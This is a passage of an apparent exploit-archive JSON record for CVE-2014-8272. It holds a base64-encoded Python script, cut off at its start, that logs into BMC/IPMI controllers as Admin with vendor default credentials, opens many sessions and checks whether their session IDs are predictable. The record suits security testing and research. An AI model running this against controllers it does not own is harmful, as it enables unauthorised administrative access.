ZWNpZmllZC9pbiBkZWZhdWx0IGxpc3QiDQogICAgICAgICAgICAgICAgcHJpbnQgIiAgICBWZW5kb3JzIHdpdGggRGVmYXVsdCBBY2NvdW50cyINCiAgICAgICAgICAgICAgICBwcmludCAiICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIg0KICAgICAgICAgICAgICAgIGZvciB2ZW5kb3IsYWNjdCBpbiB2ZW5kb3JzLml0ZXJpdGVtcygpOg0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgIiAgICAlczogdXNlcm5hbWU9JyVzJywgcGFzc3dvcmQ9JyVzJyIlKHZlbmRvcixhY2N0WyJ1c2VyIl0sYWNjdFsicHdkIl0pDQogICAgICAgICAgICAgICAgc3lzLmV4aXQoMSkNCiAgICAgICAgDQogICAgICAgIGlmIGFyZ3MudXNlcm5hbWUgaXMgTm9uZTogICBhcmdzLnVzZXJuYW1lID0gdmVuZG9yc1thcmdzLnZlbmRvcl1bInVzZXIiXS5sanVzdCgxNiwgJ1x4MDAnKQ0KICAgICAgICBpZiBhcmdzLnBhc3N3b3JkIGlzIE5vbmU6ICAgYXJncy5wYXNzd29yZCA9IHZlbmRvcnNbYXJncy52ZW5kb3JdWyJwd2QiXS5sanVzdCgxNiwgJ1x4MDAnKQ0KDQoNCiAgICAgICAgZ2xvYmFsIEhPU1QsIFBPUlQNCiAgICAgICAgSE9TVCA9IGFyZ3MuaXAgIA0KICAgICAgICBQT1JUID0gYXJncy51ZHBwb3J0DQoNCiAgICAgICAgcHJpbnQgIlNjcmlwdCBQYXJhbWV0ZXJzIg0KICAgICAgICBwcmludCAiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSINCiAgICAgICAgcHJpbnQgIklQICAgICAgIDogJXMiJUhPU1QgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgcHJpbnQgIlBvcnQgICAgIDogJWQiJVBPUlQNCiAgICAgICAgcHJpbnQgIlVzZXJuYW1lIDogJXMiJWFyZ3MudXNlcm5hbWUNCiAgICAgICAgcHJpbnQgIlBhc3N3b3JkIDogJXMiJWFyZ3MucGFzc3dvcmQNCg0KICAgICAgICBzZXNzaW9uX2lkcyA9IFtdDQogICAgICAgIGZvciBpIGluIHhyYW5nZSgweDgwKTogICNkbyBub3QgZ28gYmV5b25kIDB4RkYsIGJlY2F1c2Ugb2YgaG93IHNlc3Npb25faWRzIGlzIGNoZWNrZWQgZm9yIGluY3JlbWVudGFsIGxhdGVyDQogICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgY29kZSwgdGVtcF9zZXNzX2lkLCBzZXNzX3NlcSwgc2Vzc19pZCA9IFNldFVwU2Vzc2lvbiAoYXJncy51c2VybmFtZSwgYXJncy5wYXNzd29yZCwgcHJpdj0nQWRtaW4nLCBhdXRoPSdNRDUnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgY29kZSA9PSAwOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZXNzaW9uX2lkcy5hcHBlbmQodGVtcF9zZXNzX2lkKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZXNzaW9uX2lkcy5hcHBlbmQoc2Vzc19pZCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1srJTA0WF0gdGVtcF9zZXNzX2lkPSUwOFgsIHNlc3NfaWQ9JTA4WCclKGksIHRlbXBfc2Vzc19pZCwgc2Vzc19pZCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNwcmludCAnWy0lMDRYXSBTZXRVcCBTZXNzaW9uOiBUcnlpbmcgYWdhaW4gYWZ0ZXIgdGltZW91dCA1cyclKGkpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNsZWVwKDUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlDQoNCg0KICAgICAgICAgICAgICAgICAgICAgICAgY29kZSA9IENsb3NlU2Vzc2lvbiAoc2Vzc19zZXEsIHNlc3NfaWQpDQogICAgICAgICAgICAgICAgICAgICAgICBpZiBjb2RlID09IDA6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNwcmludCAnWyslMDRYXSBDbG9zZSBTZXNzaW9uIE9LJyUoaSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaSArPSAxDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNsZWVwICgwLjUpDQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjcHJpbnQgJ1stJTA0WF0gQ2xvc2UgU2Vzc2lvbiBmYWlsOiBXYWl0IGZvciBuYXR1cmFsIHRpbWVvdXQgKDYwKy8tM3MpJyUoaSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2xlZXAoNjUpDQoNCiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICAgICAgICAgICAgICBleGNfdHlwZSwgZXhjX29iaiwgZXhjX3RiID0gc3lzLmV4Y19pbmZvKCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGZuYW1lID0gb3MucGF0aC5zcGxpdChleGNfdGIudGJfZnJhbWUuZl9jb2RlLmNvX2ZpbGVuYW1lKVsxXQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgKGV4Y190eXBlLCBmbmFtZSwgZXhjX3RiLnRiX2xpbmVubykNCg0KDQogICAgICAgIHNlc3Npb25faWRzID0gc2Vzc2lvbl9pZHNbOjB4RkZdDQogICAgICAgIA0KICAgICAgICAjZ2V0IHRoZSBmaXJzdCBpbmNyZW1lbnRhbCBkaWZmDQogICAgICAgIGNvbnN0X2RpZmYgPSBOb25lDQogICAgICAgIGZvciBpIGluIHhyYW5nZSgxLCBsZW4oc2Vzc2lvbl9pZHMpKToNCiAgICAgICAgICAgICAgICBpZiBzZXNzaW9uX2lkc1tpLTFdIDwgc2Vzc2lvbl9pZHNbaV06DQogICAgICAgICAgICAgICAgICAgICAgICBjb25zdF9kaWZmID0gc2Vzc2lvbl9pZHNbaV0gLSBzZXNzaW9uX2lkc1tpLTFdDQogICAgICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAjY2hlY2sgaWYgc2Vzc2lvbl9pZHMgYXJlIGluY3JlYXNpbmcgYXQgYSBmaXhlZCB2YWx1ZQ0KICAgICAgICB2dWxuZXJhYmxlID0gVHJ1ZQ0KICAgICAgICBjcm9zc2VkX3ZhbHVlX2JvdW5kYXJ5ID0gMA0KICAgICAgICBmb3IgaSBpbiB4cmFuZ2UoMSwgbGVuKHNlc3Npb25faWRzKSk6DQoNCiAgICAgICAgICAgICAgICBpZiBzZXNzaW9uX2lkc1tpXS1zZXNzaW9uX2lkc1tpLTFdICE9IGNvbnN0X2RpZmY6DQogICAgICAgICAgICAgICAgICAgICAgICBpZiBjcm9zc2VkX3ZhbHVlX2JvdW5kYXJ5IDwgMjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY3Jvc3NlZF92YWx1ZV9ib3VuZGFyeSArPSAxDQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2dWxuZXJhYmxlID0gRmFsc2UNCg0KICAgICAgICBpZiB2dWxuZXJhYmxlOg0KICAgICAgICAgICAgICAgIHByaW50ICJDb25jbHVzaW9uOiBCTUMgaXMgdnVsbmVyYWJsZSB0byBDVkUtMjAxNC04MjcyIg0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIHByaW50ICJDb25jbHVzaW9uOiBCTUMgaXMgbm90IHZ1bG5lcmFibGUgdG8gQ1ZFLTIwMTQtODI3MiINCg0KICAgICAgICANCiAgICAgICAgDQoNCg0KDQppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOg0KICAgIG1haW4oKQ==", 
    "filename": "platforms/hardware/webapps/35770.py", 
    "id": "35770", 
    "cves": [
        "CVE-2014-8272"
    ]
}